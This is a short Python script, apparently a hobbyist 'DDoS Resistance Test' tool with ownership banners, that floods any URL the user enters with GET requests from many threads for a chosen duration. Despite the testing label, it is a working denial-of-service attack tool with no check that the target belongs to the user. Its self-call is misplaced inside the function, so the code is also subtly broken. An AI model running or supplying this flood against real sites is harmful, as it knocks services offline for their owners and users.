# Copyright (c) tool IKO/Swnax
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.
import threading
import requests
import time
def ddos_resistance_test():
    print("DDoS Resistance Test")
    target_url = input("\033[93mPlease enter the target URL (e.g., https://example.com): \033[0m")
    num_threads = int(input("\033[93mEnter the number of threads: \033[0m"))
    attack_duration = int(input("\033[93mEnter the duration of the attack in seconds: \033[0m"))
    print("Starting the DDoS resistance test...")
    def send_requests():
        end_time = time.time() + attack_duration
        while time.time() < end_time:
            try:
                response = requests.get(target_url)
                print(f"Request sent, status code: {response.status_code}")
            except requests.RequestException as e:
                print(f"Error sending request: {e}")
    threads = [threading.Thread(target=send_requests) for _ in range(num_threads)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    print("DDoS resistance test completed.")
    ddos_resistance_test()
# Copyright (c) tool IKO/Swnax
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.